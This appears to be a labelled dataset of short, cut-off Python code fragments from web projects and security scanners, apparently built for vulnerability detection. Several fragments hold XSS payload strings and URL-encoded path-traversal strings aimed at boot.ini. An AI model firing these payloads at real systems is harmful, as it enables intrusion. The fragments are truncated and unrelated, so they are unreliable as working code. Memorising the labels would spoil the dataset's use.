no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype", "label": 0}, {"snippet_id": 24061, "code": ", procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes", "label": 0}, {"snippet_id": 47349, "code": ".models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id", "label": 0}, {"snippet_id": 31673, "code": " \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct", "label": 0}, {"snippet_id": 38504, "code": "\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 37305, "code": " Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): ", "label": 0}, {"snippet_id": 42260, "code": ".valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype", "label": 0}, {"snippet_id": 3076, "code": " payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find(", "label": 0}, {"snippet_id": 2989, "code": "'': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param", "label": 0}, {"snippet_id": 42666, "code": ") \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields", "label": 0}, {"snippet_id": 45448, "code": " force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data[", "label": 0}, {"snippet_id": 47256, "code": ".commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata.details_view', id", "label": 0}, {"snippet_id": 25847, "code": ".type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None", "label": 0}, {"snippet_id": 32881, "code": "=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith(", "label": 1}, {"snippet_id": 31114, "code": ") \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x", "label": 0}, {"snippet_id": 21840, "code": "): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),", "label": 0}, {"snippet_id": 50140, "code": " sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated", "label": 0}, {"snippet_id": 49556, "code": "[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None", "label": 0}, {"snippet_id": 3226, "code": "(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={", "label": 0}, {"snippet_id": 9126, "code": "'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 1}, {"snippet_id": 10284, "code": " traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 32892, "code": "\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('',", "label": 1}, {"snippet_id": 26730, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../..", "label": 0}, {"snippet_id": 23990, "code": ", expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2", "label": 0}, {"snippet_id": 25100, "code": "-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=(", "label": 0}, {"snippet_id": 31298, "code": " \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t", "label": 0}, {"snippet_id": 48567, "code": "\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects", "label": 0}, {"snippet_id": 46038, "code": ".get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user", "label": 0}, {"snippet_id": 27730, "code": " before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200): \"\"\"Write JSON response.\"\"\" self._add_security_response_headers() self.response", "label": 0}, {"snippet_id": 18039, "code": "', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect", "label": 0}, {"snippet_id": 23997, "code": " processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str", "label": 0}, {"snippet_id": 2242, "code": ",body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs", "label": 0}, {"snippet_id": 19526, "code": " and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 46896, "code": ".love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url", "label": 0}, {"snippet_id": 47430, "code": "(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get('fault') and profile", "label": 0}, {"snippet_id": 11506, "code": ".update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\")", "label": 0}, {"snippet_id": 49724, "code": " render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip(", "label": 1}, {"snippet_id": 4802, "code": "<html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q", "label": 0}, {"snippet_id": 19359, "code": "'VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo'", "label": 1}, {"snippet_id": 19700, "code": " sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils", "label": 0}, {"snippet_id": 15143, "code": " sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils", "label": 0}, {"snippet_id": 26692, "code": "%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',", "label": 0}, {"snippet_id": 35918, "code": "\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t", "label": 0}, {"snippet_id": 8072, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 49716, "code": "\nfrom flask_socketio import SocketIO,emit from flask import Flask, render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample", "label": 1}, {"snippet_id": 4990, "code": "<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=", "label": 0}, {"snippet_id": 9180, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 54808, "code": " model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile", "label": 0}, {"snippet_id": 31274, "code": "=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv", "label": 0}, {"snippet_id": 39033, "code": " else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname]", "label": 0}, {"snippet_id": 42412, "code": "\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry:", "label": 0}, {"snippet_id": 28990, "code": "><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr) \t\tpass \t\t def install_haproxy(serv, **kwargs): \timport sql \tscript=\"install_haproxy.sh\" \ttmp_config_path=sql", "label": 0}, {"snippet_id": 16447, "code": " is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url", "label": 0}, {"snippet_id": 42860, "code": "\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t", "label": 0}, {"snippet_id": 1486, "code": " from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost'", "label": 0}, {"snippet_id": 15099, "code": ".tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports", "label": 0}, {"snippet_id": 2200, "code": "(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%", "label": 0}, {"snippet_id": 6196, "code": " cores in the password pre-hash function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, ", "label": 0}, {"snippet_id": 24012, "code": " --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 42289, "code": ".doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):", "label": 0}, {"snippet_id": 11786, "code": " name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns", "label": 0}, {"snippet_id": 14975, "code": "('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command", "label": 0}, {"snippet_id": 52315, "code": ".') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status", "label": 0}, {"snippet_id": 44407, "code": "=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow", "label": 0}, {"snippet_id": 19212, "code": ".setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 14957, "code": "(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in", "label": 0}, {"snippet_id": 23122, "code": "[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 26288, "code": " try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors", "label": 0}, {"snippet_id": 44556, "code": ".objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc,", "label": 0}, {"snippet_id": 36112, "code": " is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield", "label": 0}, {"snippet_id": 30188, "code": " is not None: \tserv=form.getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview()", "label": 0}, {"snippet_id": 19557, "code": " from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh", "label": 0}, {"snippet_id": 17867, "code": "'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template", "label": 0}, {"snippet_id": 1930, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=", "label": 0}, {"snippet_id": 19458, "code": "{repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count", "label": 0}, {"snippet_id": 42180, "code": "(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format", "label": 0}, {"snippet_id": 12253, "code": "'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses", "label": 1}, {"snippet_id": 7296, "code": " name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static", "label": 0}, {"snippet_id": 51522, "code": "', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django_otp.middleware.OTPMiddleware", "label": 0}, {"snippet_id": 14880, "code": " test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp ", "label": 0}, {"snippet_id": 7756, "code": "<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware", "label": 0}, {"snippet_id": 53411, "code": "(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects", "label": 0}, {"snippet_id": 49771, "code": " id=history></div> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html", "label": 0}, {"snippet_id": 20012, "code": ".serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize(", "label": 0}, {"snippet_id": 49989, "code": " force_unicode from django.conf import settings from evennia.utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session", "label": 0}, {"snippet_id": 46026, "code": ") if not hue_collections or not collection_id: return admin_collections(request, True, is_mobile) try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception", "label": 0}, {"snippet_id": 21937, "code": ")$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r", "label": 0}, {"snippet_id": 26242, "code": " in self.changed_data or not data.get('vat_id'): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id", "label": 0}, {"snippet_id": 34975, "code": " \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns", "label": 0}, {"snippet_id": 1447, "code": " resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}", "label": 0}, {"snippet_id": 28730, "code": " False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do", "label": 1}, {"snippet_id": 46962, "code": " async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter", "label": 0}, {"snippet_id": 41678, "code": " BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument", "label": 0}, {"snippet_id": 10326, "code": " processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str", "label": 0}, {"snippet_id": 44108, "code": ".mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;", "label": 0}, {"snippet_id": 43225, "code": "(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t", "label": 0}, {"snippet_id": 20293, "code": " def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir", "label": 0}, {"snippet_id": 16454, "code": "\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render',", "label": 0}, {"snippet_id": 12571, "code": "/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications',", "label": 0}, {"snippet_id": 27127, "code": ", params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value", "label": 1}, {"snippet_id": 6486, "code": " SSO session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value", "label": 0}, {"snippet_id": 17669, "code": "?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"", "label": 0}, {"snippet_id": 26941, "code": "]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter", "label": 0}, {"snippet_id": 11285, "code": " self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https:", "label": 0}, {"snippet_id": 54139, "code": "*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky", "label": 0}, {"snippet_id": 5540, "code": "(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))", "label": 0}, {"snippet_id": 9834, "code": " if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 52334, "code": " response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow", "label": 0}, {"snippet_id": 34320, "code": "\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value", "label": 0}, {"snippet_id": 40201, "code": " \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError", "label": 0}, {"snippet_id": 38628, "code": "._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t", "label": 0}, {"snippet_id": 19097, "code": " import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler", "label": 0}, {"snippet_id": 20090, "code": "-xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report)", "label": 0}, {"snippet_id": 42143, "code": ".fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname", "label": 0}, {"snippet_id": 21012, "code": " continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 28769, "code": " def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password", "label": 0}, {"snippet_id": 50695, "code": " csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"\"\" Data Evennia -> User Kwargs: kwargs(any): Options to the protocol \"\"\" self.sessionhandler.data_out(self, ", "label": 0}, {"snippet_id": 51374, "code": " 'user', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename', 'internal_filename", "label": 1}, {"snippet_id": 12959, "code": "=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'", "label": 0}, {"snippet_id": 994, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse", "label": 1}, {"snippet_id": 54012, "code": " import * from tkinter import ttk except: print(\"You need to install: tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self):", "label": 0}, {"snippet_id": 53414, "code": " response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): 